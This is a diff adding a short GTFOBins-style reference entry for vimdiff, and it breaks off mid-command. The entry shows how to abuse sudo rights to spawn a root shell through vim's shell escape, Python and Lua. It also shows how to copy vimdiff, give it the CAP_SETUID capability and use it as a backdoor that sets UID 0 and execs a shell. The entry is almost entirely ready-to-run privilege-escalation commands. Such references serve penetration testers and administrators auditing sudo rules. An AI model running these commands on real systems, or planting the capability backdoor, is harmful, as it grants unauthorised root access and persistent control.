@@ -1,0 +1,21 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * sudo vimdiff -c ':!/bin/sh'
+    * This requires that vimdiff is compiled with Python support. Prepend :py3
+      for Python 3.
+      sudo vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset;
+      exec sh")'
+    * This requires that vimdiff is compiled with Lua support.
+      sudo vimdiff -c ':lua os.execute("reset; exec sh")'
+***** Capabilities *****
+If the binary has the Linux CAP_SETUID capability set or it is executed by
+another binary with the capability set, it can be used as a backdoor to
+maintain privileged access by manipulating its own process UID.
+    * This requires that vimdiff is compiled with Python support. Prepend :py3
+      for Python 3.
+      cp $(which vimdiff) .
+      sudo setcap cap_setuid+ep vimdiff
+
+      ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-
